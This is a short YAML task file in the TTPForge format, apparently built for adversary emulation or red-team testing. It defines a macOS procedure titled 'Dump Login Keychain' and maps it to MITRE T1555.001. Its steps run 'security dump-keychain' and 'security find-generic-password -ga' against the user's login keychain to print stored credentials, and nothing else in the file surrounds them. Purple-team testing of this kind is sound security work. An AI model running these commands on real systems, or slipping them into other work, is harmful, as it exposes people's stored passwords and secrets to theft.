---
api_version: 2.0
uuid: d1cbb8d7-e897-4d03-a558-cff24ce36be2
name: Dump Login Keychain
authors:
- TTPForge
description: |
  Extract credentials from macOS login keychain using security command
mitre:
  tactics:
  - TA0006 Credential Access
  techniques:
  - T1555 Credentials from Password Stores
  subtechniques:
  - 'T1555.001 Credentials from Password Stores: Keychain'
requirements:
  platforms:
  - os: darwin
args:
- name: keychain_path
  description: Path to keychain database
  type: string
  default: ~/Library/Keychains/login.keychain-db
steps:
- name: Check Keychain Access
  inline: security default-keychain
- name: Dump Login Keychain
  inline: security dump-keychain {{ .Args.keychain_path }}
- name: Extract Keychain Items
  inline: security find-generic-password -ga '*' {{ .Args.keychain_path }} 2>/dev/null | head -20
tests:
- name: dry_run_test
  dry_run: true
